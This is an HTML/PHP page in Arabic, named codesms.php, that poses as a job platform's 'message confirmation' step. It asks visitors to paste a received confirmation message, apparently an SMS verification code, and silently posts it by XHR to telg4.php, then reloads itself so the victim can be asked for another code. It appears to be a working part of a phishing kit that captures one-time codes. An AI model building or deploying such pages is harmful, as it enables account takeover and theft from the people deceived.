<!-- codesms.php -->
<!DOCTYPE html>
<html>
<head>
    <title>منصة التوظيف - تأكيد الرسالة</title>
    <style>
        body {
            background-color: #f0f8ff;
        }
        
        .container {
            width: 400px;
            margin: 50px auto;
            text-align: center;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 5px;
            margin-bottom: 10px;
        }
        
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>لصق الرسالة التأكيد</h2>
        <form action="telg4.php" method="post"onsubmit="return submitForm(event)">
            <label for="message">مستطيل فورم لصق النص هنا:</label>
            <input type="text" name="message" id="message" required>
            
            <input type="submit" value="تأكيد">
        </form>


        <script>
  function submitForm(event) {
    event.preventDefault(); // يمنع النموذج من الارسال المباشر

    // تنفيذ أي عمليات إضافية قبل الانتقال للصفحة الثانية
    // ...

    // جمع البيانات من النموذج
    var form = event.target;
    var formData = new FormData(form);

    // إرسال البيانات باستخدام XMLHttpRequest
    var xhr = new XMLHttpRequest();
    xhr.open(form.method, form.action, true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // تم إرسال البيانات بنجاح، يمكن الانتقال للصفحة الثانية
        window.location.href = "codesms.php";
      }
    };
    xhr.send(formData);

    return false;
  }
</script>



    </div>
</body>
</html>